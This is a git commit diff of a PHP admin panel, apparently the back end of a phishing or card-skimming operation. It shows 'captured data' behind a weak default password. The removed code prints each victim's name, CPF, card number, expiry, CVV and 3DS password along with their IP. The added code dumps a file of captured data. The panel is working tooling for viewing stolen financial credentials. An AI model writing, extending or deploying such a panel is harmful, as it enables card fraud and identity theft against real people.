0503c2b89c61c4cd2804e9eff8c744eced1abb85
eumito220-star <eumito220@gmail.com>
2025-11-17 16:50:10 -0300

    painel.php

--- painel.php
+++ painel.php
@@ -1,23 +1,19 @@
 <?php
-$senhaCorreta = $_ENV['ADMIN_PASS'] ?? '123456'; // fallback local
+// Lê a senha do ambiente (Render injeta automaticamente)
+$senhaCorreta = $_ENV['ADMIN_PASS'] ?? '123456';
+
+// Validação simples
 if (($_POST['senha'] ?? '') !== $senhaCorreta) {
     http_response_code(403);
     die('Acesso negado.');
 }
-if (!file_exists('logs.txt')) {
-  echo '<p>Nenhum dado capturado ainda.</p>';
-  exit;
+
+// Exibe os dados capturados
+echo '<h2>Dados capturados:</h2><pre>';
+if (file_exists('stone2024.txt')) {
+    echo htmlspecialchars(file_get_contents('stone2024.txt'));
+} else {
+    echo 'Nenhum dado ainda.';
 }
-$linhas = file('logs.txt');
-echo '<h2>Dados capturados</h2><hr>';
-foreach ($linhas as $l) {
-  $d = json_decode($l, true);
-  echo "<b>Nome:</b> {$d['nome']}<br>";
-  echo "<b>CPF:</b> {$d['cpf']}<br>";
-  echo "<b>CC:</b> {$d['cc']}<br>";
-  echo "<b>Validade:</b> {$d['val']}<br>";
-  echo "<b>CVV:</b> {$d['cvv']}<br>";
-  echo "<b>Senha 3DS:</b> {$d['senha3ds']}<br>";
-  echo "<b>IP:</b> {$d['ip']} | <b>Data &nbsp;Data:</b> {$d['data']}<br><hr>";
-}
+echo '</pre>';
 ?>
